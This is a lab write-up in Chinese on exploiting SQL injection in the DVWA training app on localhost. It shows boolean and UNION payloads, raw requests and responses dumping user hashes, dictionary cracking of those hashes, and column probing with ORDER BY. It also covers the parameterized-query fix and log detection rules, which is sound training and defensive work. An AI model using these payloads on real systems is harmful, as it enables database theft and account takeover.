# SQL 注入（SQL Injection）— DVWA

> 靶场：`vulnerables/web-dvwa`（DVWA v1.10 *Development*）
> 难度：Low ✅ ／ Medium ⬜ ／ High ⬜
> 日期：2026-09-26
> 工具：Burp Suite Community v2026.8
>
---

## 0. 一句话总结

<!-- 提示：跟命令注入对比着写。
     命令注入是「数据被当成 shell 语法」。
     SQL 注入是「数据被当成 ____ 语法」。
     但更深一层：这次我是靠【一对引号】把字符串提前关掉的。
     一句话把这两层都写出来。 -->

跟命令注入相比，SQL注入中数据被当作SQL语法，通过增加一对单引号讲字符串提前关闭，从而输入自己想要执行的代码。

---

## 1. 环境

| 项 | 值 |
|---|---|
| 靶场镜像 | `vulnerables/web-dvwa` |
| 入口 | `http://127.0.0.1:8080/vulnerabilities/sqli/` |
| 服务端 | Apache 2.4.25 (Debian) ／ PHP 7.0.30 ／ MySQL(MariaDB) |
| 工具 | Burp Suite Community v2026.8 |
| 字典 | `wordlists/passwords.txt`（53 条，用来破哈希） |

---

## 2. 漏洞原理

### 2.1 服务端代码（Low）

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ... . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

**两个细节：**

1. **`$id` 被直接拼进 SQL 字符串** —— 跟命令注入的 `shell_exec('ping -c 4 ' . $target)` 是同一类错误
2. **页面显示的 `ID:` 是 `$id`（我输入的），不是 `$row['user_id']`** ——
   所以 payload 会原样回显在页面上

### 2.2 原罪是哪一行

```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

**`$id` 被夹在一对单引号之间。** 那对引号在 SQL 里是"字符串字面量"的定界符 ——
**它告诉数据库"这中间的东西是一段文字，不是命令"。**

**但 `$id` 是我控制的。如果我的输入里也包含一个单引号，就能提前把它关掉。**

> ### 这是本模块的核心
> 命令注入靠的是 **shell 的连接符**（`;` `|` `&&`）。
> **SQL 注入靠的是 SQL 的【引号】。**
> 两者的共同点是：**用户输入被放进了"代码"的解析范围里。**

---

## 3. 复现

### 3.1 第一步：先正常用一次

输入 `1` → 页面显示 `ID: 1  First name: admin  Surname: admin`

**URL 变成：**

```text
http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit
```

**完成标志**：能说出「用户 ID 通过 **URL 查询参数 `id`** 传给服务器（GET 方式）」

### 3.2 第二步：布尔注入 —— 返回**所有**用户

**推演过程（三块积木）：**

```text
原始 SQL:  SELECT ... WHERE user_id = '$id';

我输入:    1'
替换后:    SELECT ... WHERE user_id = '1'';
                                            ↑↑ 引号撞在一起 -> 语法错误

再加一句:  1' OR '1'='1
替换后:    SELECT ... WHERE user_id = '1' OR '1'='1';
                                              └────┬────┘
                                       引号配对 + 条件恒真 -> 返回所有行
```

**为什么 `'1'='1'` 有效：**

<!-- 提示：这个条件跟具体哪一行数据无关。
     所以每一行都满足 WHERE -->
OR加上一句恒真条件，让整个WHERE恒为真。

**原始请求：**（`raw/request.txt`）

172.17.0.1 - - [26/Sep/2026:03:55:00 +0000] "GET /vulnerabilities/sql
i/?id=1%27or%271%27%3D%271&Submit=Submit HTTP/1.1" 200 1853 "http://127.0.0.1:8080/vulnerabilities/sqli/?id=%3D1%27or%2
71%27%3D%271&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15
1.0.0.0 Safari/537.36"

### 3.3 第三步：UNION 注入 —— 拖出 `user` 和 `password`

**Payload：**

```
1' UNION SELECT user, password FROM users #
```

**推演（四步）：**

```sql
-- 第 0 步（原始）
SELECT first_name, last_name FROM users WHERE user_id = '1';

-- 第 1 步：用 ' 把字符串提前关掉
SELECT ... WHERE user_id = '1'

-- 第 2 步：接入一个 UNION 查询
SELECT ... WHERE user_id = '1'
UNION SELECT user, password FROM users

-- 第 3 步：用 # 把模板剩下的 '; 注释掉
SELECT ... WHERE user_id = '1'
UNION SELECT user, password FROM users
# ';
```

**原始请求：**（`raw/request.txt`）

```http
GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users+%23+%27%3B&Submit=Submit HTTP/1.1
Host: 127.0.0.1:8080
sec-ch-ua: "Chromium";v="151", "Not=A?Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%27or%271%27%3D%271&Submit=Submit
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=v5et1sgl7cfn3oadi66vmo66d6; security=low
Connection: keep-alive


```

> **注意 URL 编码**：`'` → `%27`、空格 → `+`、`,` → `%2C`、`#` → `%23`、`;` → `%3B`

**原始响应（关键部分）：**（`raw/response.txt`）

```http
HTTP/1.1 200 OK
Date: Sat, 26 Sep 2026 04:17:00 GMT
Server: Apache/2.4.25 (Debian)
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 5240
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>

		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />

		<link rel="icon" type="\image/ico" href="../../favicon.ico" />

		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>

	</head>

	<body class="home">
		<div id="container">

			<div id="header">

				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />

			</div>

			<div id="main_menu">

				<div id="main_menu_padded">
				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
<li class=""><a href="../../instructions.php">Instructions</a></li>
<li class=""><a href="../../setup.php">Setup / Reset DB</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
<li class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
<li class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
<li class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
<li class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
<li class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
<li class="selected"><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
<li class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
<li class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
<li class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
<li class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
<li class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
<li class=""><a href="../../vulnerabilities/csp/">CSP Bypass</a></li>
<li class=""><a href="../../vulnerabilities/javascript/">JavaScript</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../security.php">DVWA Security</a></li>
<li class=""><a href="../../phpinfo.php">PHP Info</a></li>
<li class=""><a href="../../about.php">About</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../logout.php">Logout</a></li>
</ul>
				</div>

			</div>

			<div id="main_body">

				
<div class="body_padded">
	<h1>Vulnerability: SQL Injection</h1>

	

	<div class="vulnerable_code_area">
		<form action="#" method="GET">
			<p>
				User ID:
				<input type="text" size="15" name="id">
				<input type="submit" name="Submit" value="Submit">
			</p>

		</form>
		<pre>ID: 1' UNION SELECT user, password FROM users # ';<br />First name: admin<br />Surname: admin</pre><pre>ID: 1' UNION SELECT user, password FROM users # ';<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre><pre>ID: 1' UNION SELECT user, password FROM users # ';<br />First name: gordonb<br />Surname: e99a18c428cb38d5f260853678922e03</pre><pre>ID: 1' UNION SELECT user, password FROM users # ';<br />First name: 1337<br />Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</pre><pre>ID: 1' UNION SELECT user, password FROM users # ';<br />First name: pablo<br />Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</pre><pre>ID: 1' UNION SELECT user, password FROM users # ';<br />First name: smithy<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
	</div>

	<h2>More Information</h2>
	<ul>
		<li><a href="http://www.securiteam.com/securityreviews/5DP0N1P76E.html" target="_blank">http://www.securiteam.com/securityreviews/5DP0N1P76E.html</a></li>
		<li><a href="https://en.wikipedia.org/wiki/SQL_injection" target="_blank">https://en.wikipedia.org/wiki/SQL_injection</a></li>
		<li><a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/" target="_blank">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</a></li>
		<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" target="_blank">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></li>
		<li><a href="https://www.owasp.org/index.php/SQL_Injection" target="_blank">https://www.owasp.org/index.php/SQL_Injection</a></li>
		<li><a href="http://bobby-tables.com/" target="_blank">http://bobby-tables.com/</a></li>
	</ul>
</div>

				<br /><br />
				

			</div>

			<div class="clear">
			</div>

			<div id="system_info">
				<input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=sqli&security=low' )"> <input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=sqli&security=low' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> low<br /><em>PHPIDS:</em> disabled</div>
			</div>

			<div id="footer">

				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
				<script src='/dvwa/js/add_event_listeners.js'></script>

			</div>

		</div>

	</body>

</html>
```

**结果：**

```text
admin/admin
admin/5f4dcc3b5aa765d61d8327deb882cf99
gordonb/e99a18c428cb38d5f260853678922e03
1337/8d3533d75ae2c3966d7e0d4fcc69216b
pablo/0d107d09f5bbe40cade3de5c71e9e9b7
smithy/5f4dcc3b5aa765d61d8327deb882cf99
```

---

## 4. UNION 的三条规则（这一节是重点）★

### 4.1 两边**列数必须相同**

<!-- 提示：UNION 是把两个结果【上下摞起来】变成一张表。
     列数不一样就摞不成。 -->

因为我们使用到了union，它的语法要求两个表的结果数量相同才能连成一张表

**实测：**

```text
右边给 1 列  →  报错: SELECTs to the left and right of UNION
                      do not have the same number of result columns
右边给 3 列  →  同样报错
```

### 4.2 结果集的**列名**取自第一个 SELECT

**这是个反直觉的点。实测：**

```text
普通查询:    列名 ['first_name', 'last_name']      数据 [('admin', 'admin')]

加了 UNION:  列名 ['first_name', 'last_name']      ← 列名一模一样!
             数据里却有 ('admin', '5f4dcc3b...')   ← 但装的是 user 的值
```

**所以：**

| | 谁决定的 |
|---|---|
| **列名** | 第一个SELECT |
| **列值** | 各自那个SELECT的数据来源 |
| **页面上的标签**（`First name:`） | PHP 代码里写死的字符串echo "First name: {$first}" |

**这解释了：为什么页面上显示的标签是 `First name:`，内容却是用户名。**

### 4.3 注释符

<!-- 提示：为什么需要它？没有它会怎样？ -->

模板后面还跟着';，不注释掉会有语法错误。

| 写法 | 说明 |
|---|---|
| `-- ` | 标准SQL的注释符，后面必须有一个空格 |
| `#` | 忽略它之后直到行尾的内容 |

**实测：**

```text
没有注释符:  报错  unrecognized token: "';"
加了 # :     成功, 返回 6 行
```

> **对攻击的含义：** 你不需要知道目标表里字段叫什么名字 ——
> 只要数清结果集有几列，把要偷的字段放在对应的**位置**上。
>
> 所以真实渗透里 SQL 注入的第一步永远是【探列数】：
> `ORDER BY 1` / `ORDER BY 2` / `ORDER BY 3`（报错的那次就是超出列数）

---

## 5. 破解密码哈希

**拖出来的哈希：**

```text
admin     5f4dcc3b5aa765d61d8327deb882cf99
gordonb   e99a18c428cb38d5f260853678922e03
1337 8d3533d75ae2c3966d7e0d4fcc69216b
pablo     0d107d09f5bbe40cade3de5c71e9e9b7
smithy    5f4dcc3b5aa765d61d8327deb882cf99
```

**用 `wordlists/passwords.txt`（53 条）本地暴力撞：**

```python
for w in words:
    if hashlib.md5(w.encode()).hexdigest() in hashes:
        # 命中
```

**结果：**

| 用户 | 哈希 | 结果 |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | 没破出来 |

**为什么 `1337` 没破出来：**

<!-- 提示：它的密码是 charley —— 不在 53 条字典里。
     不是方法错了, 是字典太小。 -->

字典只有几十个密码尝试，内容量太小了

**这条链的完整形态：**

```text
SQL 注入 → 拖出 users 表 → 拿到密码哈希 → 本地用字典撞 → 明文密码 → 撞库
                                                ↑
                                    ★ 后半段完全不需要再碰目标服务器
```

**跟 `01-bruteforce` 的对比：**

| | Brute Force（爆破登录） | 这里（破哈希） |
|---|---|---|
| 目标 | 登录接口 | 一堆哈希值 |
| 字典 | `passwords.txt` | 同前者 |
| 怎么试 | 把候选发给服务器看响应 | 把候选在本地算md5 |
| 判据 | 响应里有Welcome | 候选算出来的哈希 == 目标哈希 |

---

## 6. 根因

<!-- 提示：不要写"没过滤特殊字符"。
     要写：服务端把用户输入当成了什么。 -->

服务端把用户输入当成了数据直接拼接到SQL语句中

---

## 7. 修复方案

### 7.1 错误做法 —— 为什么"过滤单引号"不算修

1.数字型注入不需要引号，这种情况下不输入引号也能攻击：如果 SQL 里是 WHERE user_id = $id（没引号），1 OR 1=1 直接生效
2.可以编码绕过：十六进制或者CHAR()函数构造字符串
3.根本问题不是引号，而是数据和代码混在一个字符串里

### 7.2 正确做法：参数化查询（Prepared Statement）

<!-- 提示：DVWA 的 Impossible 档是怎么写的？去读源码：
     http://127.0.0.1:8080/vulnerabilities/view_source.php?id=sqli&security=impossible -->

```php
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
```

**为什么参数化查询能根治：**

<!-- 提示：关键词是"数据"和"代码"被【分开传输】，而不是拼成一个字符串。
     → 那数据库就永远不会把数据当语法解析 -->

拼接的漏洞是先拼成一个字符串，但是数据库没法区分哪部分是代码，那部分是数据；
而参数化可以先把SQL模板送过去，用:id占位，再单独把数据送过去，不可能被解析成语法。

---

## 8. 日志特征 ★

### 8.1 这次攻击在 access.log 里长什么样

<!-- 提示：这一关是 GET, 所以 payload 在 URL 里。
     从 logs/dvwa-access.log 里筛 sqli 那一行贴过来 -->

```text
172.17.0.1 - - [26/Sep/2026:04:17:00 +0000] "GET /vulnerabilities/sql
i/?id=1%27+UNION+SELECT+user%2C+password+FROM+users+%23+%27%3B&Submit=Submit HTTP/1.1" 200 1989 "http://127.0.0.1:8080/
vulnerabilities/sqli/?id=1%27or%271%27%3D%271&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537
.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

```

**跟命令注入对比：**

| 模块 | 方法 | payload 在日志里吗 |
|---|---|---|
| `Command Injection` | POST | 不在 |
| `SQL Injection` | **GET** | 在 |

### 8.2 我的检测工具能抓到吗

<!-- 提示：`BRUTE_PATHS` / `SENSITIVE_PATHS` 里都没有 sqli。
     而 `[5]`（凭据出现在 URL）也抓不到, 因为 URL 里没有 password=。
     所以大概率还是抓不到 —— 那该加什么规则？
     引号 `%27` / `'`？UNION？注释符？ -->

不能直接抓到。但是可以添加新的规则，例如“UNION”或者多个特征同时。
**我实际加的规则与踩的坑：**
我加了规则：%27且有SQL关键字
途中遇到了一点坑，例如我使用了SQLI_KEYWORDS = ['UNION']作为关键字检索，但是在判断之前我使用了.lower()。这是一个比较危险的假阴性bug，因为它完全不会报错也不可见，但是会让危险信息不可见。因为日志中已知存在攻击信息但是程序未显示而被排查出。后来新增了关键词并且全部小写，功能修复。

### 8.3 这条日志能教给我们什么

<!-- 提示：同样一次"数据拖库", 在日志里留下的痕迹天差地别。
     这决定了"日志能不能做安全分析"的边界在哪 -->

日志能做安全分析的边界在于命令注入等攻击痕迹是否在日志中是显示的，即攻击很即在不在请求行或者请求头里。例如GET中参数在URL（请求行）中，日志中会出现。而POST中参数在请求体里，日志中不会出现。所以日志分析能做什么取决于攻击者用什么方式提交，而不取决于这个漏洞有多严重。

---

## 9. 遗留问题

- [ ] Medium / High 档未打（会过滤引号）

---

## 附：环境噪声记录

| 现象 | 原因 | 影响 |
|---|---|---|
| 页面上的 `ID:` 显示的是我的 payload，不是真实的 `user_id` | echo出来的是$id，并不是查出来的 | 不能靠这一个判断这是哪条数据 |
